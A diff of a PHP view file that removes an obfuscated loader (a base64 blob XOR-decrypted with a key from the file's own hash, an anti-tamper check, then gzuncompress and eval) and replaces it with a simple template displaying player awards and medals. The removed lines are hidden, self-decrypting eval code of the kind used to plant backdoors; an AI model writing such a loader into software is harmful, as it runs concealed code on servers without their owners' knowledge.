@@ -1,24 +1,14 @@
 <?php
-$rpuzofyv="2784da6a0e837566c52089b43d58c2e3";
-$lhbtsuqnzm="0500590c52070e570703095152565257050102020f000706550000005b0a0402";
-$gbeygrryh="T+0Utols+gYn4cYiu4JgwBmyJi4CD22M54Qveksd4BWxkTnCwFDRVira0OSeHpO8VypEkpOUDnjG4u4Ufy2A4Li/f6YwgQSIrH6dPkfH6kKuaitOlHpad/Y6tHsdVS1dfD6OEJfi0WXwniTmTej8HNelae1bTTQziTyOWiF37rEul12YPbVqKAA+2au8yV4i1PZq+472F4ILx7iAO/veyskSH2Y+ObthUd6doWpEmzMi";
-$msmgtjh=file_get_contents(__FILE__);
-$uqlnqcw=str_replace($gbeygrryh,"",$msmgtjh);
-if(strpos($uqlnqcw,"ec"."ho")!==false||strpos($uqlnqcw,"pr"."int")!==false||strpos($uqlnqcw,"var_"."dump")!==false||strpos($uqlnqcw,"file_put_"."contents")!==false||strpos($uqlnqcw,"fw"."rite")!==false){die();}
-$yokyvpg=str_replace(array($rpuzofyv,$lhbtsuqnzm),array("SP_40105644","KP_1860f410"),$msmgtjh);
-$ebwrbaet=md5($yokyvpg);
-$qjtzkeurk=hex2bin($lhbtsuqnzm);
-$kkcqbaqgg="";
-$oseotqpow=strlen($ebwrbaet);
-for($rclzoujts=0;$rclzoujts<$oseotqpow;$rclzoujts++){
-$kkcqbaqgg.=chr(ord($qjtzkeurk[$rclzoujts])^ord($ebwrbaet[$rclzoujts]));
-}
-$hofhskken=base64_decode($gbeygrryh);
-$tsnttsyu=strlen($hofhskken);
-$bxsmofiv="";
-$tcuxostzree=strlen($kkcqbaqgg);
-for($rclzoujts=0;$rclzoujts<$tsnttsyu;$rclzoujts++){
-$bxsmofiv.=$hofhskken[$rclzoujts]^$kkcqbaqgg[$rclzoujts%$tcuxostzree];
-}
-$fhncoje="gzun"."compress";
-eval('?>' . $fhncoje($bxsmofiv) . '<?php ');
+/**
+ * Awards Screen View
+ * Displays player achievements and medals
+ */
+?>
+
+<h2><?= __('screens.awards.medals') ?></h2>
+
+<?php if (!empty($awards_html)): ?>
+    <?= $awards_html ?>
+<?php else: ?>
+    <p><?= __('screens.awards.no_medals') ?></p>
+<?php endif; ?>
